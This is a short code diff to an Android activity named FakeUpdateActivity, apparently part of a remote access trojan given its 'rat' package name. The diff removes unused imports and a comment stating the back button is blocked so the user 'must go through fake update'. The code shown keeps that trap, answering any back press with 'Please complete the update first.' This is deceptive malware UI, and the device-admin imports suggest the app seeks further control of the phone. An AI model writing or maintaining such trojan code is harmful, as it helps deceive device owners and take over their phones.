@@ -3,17 +3,13 @@ package com.enterprise.rat.activities;
 import android.app.Activity;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
-import android.content.Context;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.graphics.Color;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
 import android.provider.Settings;
 import android.view.Gravity;
-import android.view.ViewGroup;
-import android.view.WindowManager;
 import android.widget.Button;
 import android.widget.LinearLayout;
 import android.widget.ProgressBar;
@@ -121,7 +117,6 @@ public class FakeUpdateActivity extends Activity {
 
     @Override
     public void onBackPressed() {
-        // Prevent back press - must go through fake update
         Toast.makeText(this, "Please complete the update first.", Toast.LENGTH_SHORT).show();
     }
 }
